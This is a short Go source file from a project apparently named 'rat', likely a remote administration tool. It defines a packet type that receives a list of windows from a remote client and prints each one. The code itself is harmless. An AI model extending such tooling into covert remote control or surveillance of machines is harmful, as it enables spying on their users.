package main

import (
	"fmt"
	"rat/shared"
)

type WindowsPacket struct {
	Windows []shared.Window `network:"receive"`
}

func (packet WindowsPacket) Header() shared.PacketHeader {
	return shared.WindowsHeader
}

func (packet WindowsPacket) Init(c *Client) {

}

func (packet WindowsPacket) OnReceive(c *Client) error {
	for _, window := range packet.Windows {
		fmt.Println(window)
	}

	return nil
}
